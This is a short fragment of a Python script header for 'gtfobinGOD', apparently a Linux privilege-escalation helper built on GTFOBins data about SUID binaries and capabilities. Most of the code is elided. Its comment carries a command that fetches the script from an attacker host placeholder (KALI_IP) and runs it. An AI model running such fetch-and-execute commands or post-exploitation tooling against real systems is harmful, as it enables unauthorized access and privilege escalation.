#!/usr/bin/env python3
# gtfobinGOD v2.0 — Single File Edition
# github.com/bachrudinashari/gtfobinGOD
# Just transfer this ONE file: wget http://KALI_IP/god.py && python3 god.py
...
# COMMANDS and ALIASES embedded above
# CUSTOM_HINTS and CAPABILITIES_HINTS embedded above
...
def load_db(path):
    ...
    suid = set()
    limited = set()
    # Try file first, fallback to embedded
